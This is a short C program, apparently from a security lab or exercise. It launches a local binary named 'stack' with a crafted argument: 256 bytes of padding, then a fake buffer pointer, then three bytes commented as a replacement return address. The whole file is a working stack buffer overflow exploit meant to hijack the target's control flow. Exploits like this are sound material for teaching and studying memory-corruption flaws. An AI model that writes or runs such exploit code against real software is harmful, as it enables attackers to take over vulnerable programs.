#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int main( int argc, char ** argv ) {
  char * args[3];
  args[0] = "stack";
  args[1] = "AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDD"
            "EEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHH"
            "IIIIIIIIIIIIIIIIJJJJJJJJJJJJJJJJKKKKKKKKKKKKKKKKLLLLLLLLLLLLLLLL"
            "MMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNOOOOOOOOOOOOOOOOPPPPPPPPPPPPPPPP"  // buffer
            "ABCD"                                                              // buf pointer
            "\xb4\x05\x01"                                                      // return address
            ;
  args[2] = NULL;
  printf("Calling %s with arg[%d] %s\n", args[0], strlen(args[1]), args[1]);
  execvp("./stack", args);
  return 0;
}
